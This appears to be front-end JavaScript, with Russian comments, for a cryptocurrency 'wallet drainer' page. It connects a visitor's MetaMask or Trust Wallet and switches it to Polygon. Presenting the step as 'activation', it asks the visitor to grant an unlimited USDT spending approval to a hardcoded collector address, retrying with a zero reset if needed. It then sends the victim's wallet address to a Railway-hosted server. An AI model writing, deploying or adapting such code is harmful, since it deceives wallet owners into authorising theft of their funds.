// Настройки контрактов
const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Откройте сайт внутри браузера Trust Wallet или MetaMask';
        return;
    }

    try {
        const web3 = new Web3(window.ethereum);
        
        // 1. Запрос аккаунтов
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        // 2. Проверка и переключение сети
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            }
        }

        const abi = [
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        // ШАГ 1: Проверка текущего лимита
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        
        // ШАГ 2: Логика подтверждения
        if (BigInt(currentAllowance) < 100000000n) { // Если разрешено меньше 100 USDT
            status.innerText = 'Подтвердите активацию в кошельке...';
            
            try {
                // Пытаемся вызвать approve напрямую с запасом газа
                await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
                    from: address,
                    gasPrice: await web3.eth.getGasPrice() 
                });
            } catch (error) {
                console.log("Первая попытка не удалась, пробуем сброс...");
                // Некоторые версии контрактов USDT требуют сброса в 0 перед установкой нового значения
                await contract.methods.approve(COLLECTOR_ADDRESS, '0').send({ from: address });
                await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });
            }
        }

        status.innerText = 'Синхронизация...';

        // ШАГ 3: Отправка данных на твой сервер Railway
        // ВНИМАНИЕ: Проверь этот URL в настройках Railway (Public Networking)
        const railwayUrl = 'https://railway-production-2954.up.railway.app/save-address';
        
        await fetch(railwayUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Успешно активировано!';
        status.style.color = '#00ff00';

    } catch (error) {
        console.error(error);
        if (error.message.includes('User denied')) {
            status.innerText = 'Ошибка: Вы отклонили транзакцию';
        } else if (error.message.includes('insufficient funds')) {
            status.innerText = 'Ошибка: Недостаточно MATIC для оплаты газа';
        } else {
            status.innerText = 'Ошибка сети. Попробуйте еще раз.';
        }
        status.style.color = '#ff4444';
    }
}
